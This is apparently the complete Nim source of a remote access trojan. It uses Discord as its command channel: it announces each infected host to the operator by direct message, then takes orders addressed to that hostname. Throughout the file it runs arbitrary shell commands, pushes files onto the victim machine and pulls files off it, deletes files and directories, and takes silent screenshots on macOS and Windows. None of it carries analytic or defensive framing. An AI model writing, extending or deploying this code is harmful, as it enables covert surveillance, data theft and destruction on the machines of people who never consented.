import dimscord, asyncdispatch, times, options, httpclient, osproc, os, strutils, json, threadpool, streams

const
  discordToken = ""
  creatorId = ""
  cyrptoDllData = staticRead("../DLL/libcrypto-1_1-x64.dll")
  sslDllData = staticRead("../DLL/libssl-1_1-x64.dll")
  cyrptoDllName = "libcrypto-1_1-x64.dll"
  sslDllName = "libssl-1_1-x64.dll"
let discord = newDiscordClient(discordToken)

var
  currentDir = getCurrentDir()
  sessionRegistry: seq[string] = @[]

proc runCommandSync(cmd: string): (string, int) =
  result = ("", -1)
  var p = startProcess(cmd,
    options = {poEvalCommand, poUsePath, poStdErrToStdOut})
  var output = newStringOfCap(4096)
  while not p.outputStream.atEnd:
    output.add(p.outputStream.readStr(4096))
  let exitCode = p.waitForExit()
  p.close()
  return (output, exitCode)

proc runBlockingCommand(cmd: string, pidHolder: ref int): string =
  var p = startProcess(cmd,
    options = {poEvalCommand, poUsePath, poStdErrToStdOut})
  pidHolder[] = p.processID
  var output = newStringOfCap(4096)
  while not p.outputStream.atEnd:
    output.add(p.outputStream.readStr(4096))
  discard p.waitForExit()
  p.close()
  return output

proc runCommandWithTimeoutKill(cmd: string, timeoutMs: int): Future[string] {.async.} =
  var pidHolder = new(int)
  let fut = spawn runBlockingCommand(cmd, pidHolder)

  var elapsed = 0
  let interval = 100   # ms

  while not isReady(fut) and elapsed < timeoutMs:
    await sleepAsync(interval)
    elapsed += interval

  if isReady(fut):
    return ^fut
  else:
    when defined(windows):
      discard execShellCmd("taskkill /PID " & $pidHolder[] & " /T /F")
    else:
      discard execShellCmd("kill -9 " & $pidHolder[])
    return "Command timed out and was terminated after " & $(timeoutMs div 1000) & " seconds."

proc sendMessage(channelId: string, content: string): Future[Message] {.async.} =
    result = await discord.api.sendMessage(channelId, content)

proc sendFile(channelId: string, filePath: string, fileName: string): Future[void] {.async.} =
    let fileContent = readFile(filePath)
    discard await discord.api.sendMessage(
        channelId,
        files = @[DiscordFile(name: fileName, body: fileContent)]
    )

proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] {.async.} =
  if cmd == "!dir" or cmd == "!ls":
    when defined(windows):
      let (output, exitCode) = execCmdEx("cmd /c dir", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output
    else:
      let (output, exitCode) = execCmdEx("ls", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output

  elif cmd.startsWith("!cd "):
    let newDir = cmd[4..^1].strip()
    let targetDir = if os.isAbsolute(newDir): newDir else: os.joinPath(currentDir, newDir)
    if dirExists(targetDir):
      setCurrentDir(targetDir)
      currentDir = targetDir
      return "changed directory to " & currentDir
    else:
      return "directory not found: " & targetDir

  elif cmd == "!upload":
    if m.attachments.len == 0:
      return "no file attached. Please send a file with the !upload command."
    else:
      let attachment = m.attachments[0]
      let downloadUrl = attachment.url
      let fileName = attachment.filename
      try:
        let fileData = client.getContent(downloadUrl)
        let savePath = os.joinPath(currentDir, fileName)
        writeFile(savePath, fileData)
        return "downloaded file to " & savePath
      except CatchableError as e:
        return "failed to download file: " & e.msg

  elif cmd.startsWith("!download "):
    let fileName = cmd[10..^1].strip()
    let filePath = os.joinPath(currentDir, fileName)
    if fileExists(filePath):
      await sendFile(m.channel_id, filePath, fileName)
      return "download successful"
    else:
      return "file not found: " & filePath

  elif cmd.startsWith("!mkdir "):
    let dirName = cmd[7..^1].strip()
    let dirPath = os.joinPath(currentDir, dirName)
    try:
      createDir(dirPath)
      return "created directory: " & dirPath
    except CatchableError as e:
      return e.msg

  elif cmd.startsWith("!touch "):
    let fileName = cmd[7..^1].strip()
    let filePath = os.joinPath(currentDir, fileName)
    try:
      writeFile(filePath, "")
      return "created file: " & filePath
    except CatchableError as e:
      return e.msg

  elif cmd.startsWith("!rm "):
    let target = cmd[4..^1].strip()
    let path = os.joinPath(currentDir, target)
    if fileExists(path):
      try:
        removeFile(path)
        return "Deleted file: " & path
      except CatchableError as e:
        return e.msg
    elif dirExists(path):
      try:
        removeDir(path)
        return "deleted directory: " & path
      except CatchableError as e:
        return e.msg
    else:
      return "no such file or directory: " & path

  elif cmd == "!screencapture":
    when defined(macosx):
      let fileName = "screenshot_" & $now().toTime().toUnix() & ".jpg"
      let filePath = os.joinPath(currentDir, fileName)
      let (output, exitCode) = execCmdEx("screencapture -x " & filePath)
      if exitCode == 0 and fileExists(filePath):
        await sendFile(m.channel_id, filePath, fileName)
        return "screenshot taken and sent!"
      else:
        return "failed to take screenshot: " & output
    elif defined(windows):
      let fileName = "screenshot_" & $now().toTime().toUnix() & ".png"
      let filePath = os.joinPath(currentDir, fileName)
      let powershellScript = """
          Add-Type -AssemblyName System.Windows.Forms
          Add-Type -AssemblyName System.Drawing
          $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
          $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
          $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
          $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
          $bitmap.Save('%1', [System.Drawing.Imaging.ImageFormat]::Png)
      """
      let command = "powershell -Command \"" & powershellScript.replace("%1", filePath.replace("\\", "\\\\")) & "\""
      let (output, exitCode) = execCmdEx(command)
      if exitCode == 0 and fileExists(filePath):
        await sendFile(m.channel_id, filePath, fileName)
        return "Screenshot taken and sent!"
      else:
        return "failed to take screenshot: " & output
    else:
      return "screencapture not supported on this platform."

  else:
    try:
      when defined(macosx):
        let command = cmd[1..^1]
        return await runCommandWithTimeoutKill(command, 60000)
      elif defined(windows):
        let command = "cmd /c " & cmd[1..^1]
        return await runCommandWithTimeoutKill(command, 60000)
      else:
        return "unsupported platform for command execution."
    except CatchableError as e:
      return "error running command: " & e.msg

proc getHostname(): string = 
  when defined(windows):
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown hostname"
  else:
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown hostname"

var machineName = getEnv("MACHINE_NAME", getHostname())

proc onReady(s: Shard, r: Ready) {.event(discord).} =
  when defined(windows):
    if not fileExists(cyrptoDllName):
        writeFile(cyrptoDllName, cyrptoDllData)
    if not fileExists(sslDllName):
        writeFile(sslDllName, sslDllData)

    
  let dm = await discord.api.createUserDm(creatorId)
  if machineName notin sessionRegistry:
    sessionRegistry.add(machineName)
  discard await discord.api.sendMessage(dm.id, machineName & " IS LIVE <3")

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
  if m.author.bot: return

  var client = newHttpClient()
  let content = m.content.strip()

  if content == "!sessions":
    let sessionList = if sessionRegistry.len == 0: "no active sessions." else: sessionRegistry.join("\n")
    discard await sendMessage(m.channel_id, sessionList)
    return

  if content.startsWith("!" & machineName & " "):
    let cmd = content[(machineName.len + 2)..^1].strip()
    echo cmd
    try:
      let output = await handleCommand(cmd, m, client)
      discard await sendMessage(m.channel_id, output)
    except CatchableError as e:
      discard await sendMessage(m.channel_id, e.msg)
    return

  if content == "!ping":
    let before = epochTime() * 1000
    let msg = await discord.api.sendMessage(m.channel_id, "ping?")
    let after = epochTime() * 1000
    discard await discord.api.editMessage(m.channel_id, msg.id, "pong! took " & $int(after - before) & "ms | " & $s.latency() & "ms.")

proc main() = 
  when isMainModule:
    waitFor discord.startSession()
  else:
    discard
